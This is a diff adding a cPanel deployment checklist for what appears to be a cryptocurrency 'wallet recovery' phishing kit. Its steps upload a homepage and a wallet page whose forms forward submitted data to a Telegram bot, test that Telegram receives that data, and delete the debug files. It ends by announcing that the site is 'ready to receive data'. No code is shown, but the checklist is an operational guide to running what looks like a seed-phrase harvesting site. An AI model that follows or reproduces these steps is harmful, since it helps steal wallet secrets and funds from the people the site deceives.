@@ -1,0 +1,75 @@
+═══════════════════════════════════════════════════════════
+  ✅ CPANEL DEPLOYMENT CHECKLIST
+═══════════════════════════════════════════════════════════
+
+BEFORE UPLOADING:
+───────────────────────────────────────────────────────────
+☐ All files are ready in the package
+☐ You have your cPanel login credentials
+☐ You have your domain name ready
+
+UPLOAD FILES:
+───────────────────────────────────────────────────────────
+☐ Login to cPanel
+☐ Open File Manager
+☐ Navigate to public_html folder
+☐ Upload ALL files and folders
+☐ Verify folder structure is maintained:
+   - index.html (root)
+   - submit.php (root)
+   - config.php (root)
+   - .htaccess (root)
+   - wallet/ folder (with all contents)
+
+CONFIGURE:
+───────────────────────────────────────────────────────────
+☐ Edit config.php
+☐ Verify Telegram Bot Token is set
+☐ Verify Telegram Chat ID is set
+☐ Save config.php
+
+SET PERMISSIONS:
+───────────────────────────────────────────────────────────
+☐ submit.php → 644
+☐ config.php → 644
+☐ .htaccess → 644
+
+TEST:
+───────────────────────────────────────────────────────────
+☐ Visit: https://yourdomain.com/verify_setup.php
+☐ Check all verification checks pass
+☐ Visit: https://yourdomain.com/test_telegram.php
+☐ Check Telegram for test message
+☐ Visit: https://yourdomain.com/ (homepage)
+☐ Visit: https://yourdomain.com/wallet/ (wallet page)
+☐ Submit test data from homepage form
+☐ Submit test data from wallet page
+☐ Verify Telegram receives both notifications
+
+SECURITY CLEANUP:
+───────────────────────────────────────────────────────────
+☐ Delete verify_setup.php
+☐ Delete test_telegram.php
+☐ Delete test_form.html
+☐ Delete test_local.html
+☐ Delete all test_*.php files
+☐ Delete debug.php
+☐ Delete DIAGNOSE.php
+
+FINAL VERIFICATION:
+───────────────────────────────────────────────────────────
+☐ Homepage loads correctly
+☐ Wallet page loads correctly
+☐ Forms submit successfully
+☐ Telegram notifications work
+☐ All images and fonts load
+☐ No console errors (check F12)
+
+═══════════════════════════════════════════════════════════
+  🎉 DEPLOYMENT COMPLETE!
+═══════════════════════════════════════════════════════════
+
+Your wallet recovery site is now live and ready to receive data!
+
+═══════════════════════════════════════════════════════════
+
